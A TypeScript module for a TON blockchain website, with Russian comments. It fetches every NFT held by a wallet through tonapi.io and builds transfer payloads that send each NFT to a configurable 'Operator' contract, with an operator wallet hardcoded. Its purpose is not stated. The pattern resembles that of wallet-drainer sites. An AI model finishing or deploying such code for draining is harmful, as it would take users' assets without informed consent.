import { Address, beginCell, toNano } from '@ton/core';

// ⚠️ Вставь сюда реальный адрес задеплоенного Operator.tact
// Пока оставь пустую строку — сайт всё равно загрузится.
const RAW_OPERATOR_CONTRACT = '';

// Ленивая инициализация: НЕ падаем, если адрес пустой или невалидный
export function getOperatorContract(): Address | null {
  if (!RAW_OPERATOR_CONTRACT) return null;
  try {
    return Address.parse(RAW_OPERATOR_CONTRACT);
  } catch {
    console.warn('Invalid OPERATOR_CONTRACT address:', RAW_OPERATOR_CONTRACT);
    return null;
  }
}

export const OPERATOR_WALLET = Address.parse(
  'UQBR4_plcJKaOI7FOW2QVRKTane60T7qXDc8q7eHVlDORQGz'
);

export async function fetchNfts(walletAddress: string): Promise<any[]> {
  const all: any[] = [];
  const limit = 1000;
  let offset = 0;

  for (let page = 0; page < 100; page++) {
    const res = await fetch(
      `https://tonapi.io/v2/accounts/${walletAddress}/nfts?limit=${limit}&offset=${offset}&indirect=false`
    );
    if (!res.ok) throw new Error('fetch failed');
    const data = await res.json();
    const items: any[] = data.nft_items ?? [];
    all.push(...items);
    if (items.length < limit) break;
    offset += limit;
  }
  return all;
}

export function buildNftTransferToOperator(
  nftAddress: string,
  ownerAddress: string
): { address: string; amount: string; payload: string } | null {
  const contract = getOperatorContract();
  if (!contract) {
    console.warn('OPERATOR_CONTRACT not set — skip NFT transfer');
    return null;
  }

  const payload = beginCell()
    .storeUint(0x5fcc3d14, 32)
    .storeUint(0, 64)
    .storeAddress(contract)
    .storeAddress(Address.parse(ownerAddress))
    .storeBit(0)
    .storeCoins(toNano('0.01'))
    .storeBit(0)
    .endCell()
    .toBoc()
    .toString('base64');

  return {
    address: nftAddress,
    amount: toNano('0.05').toString(),
    payload,
  };
}
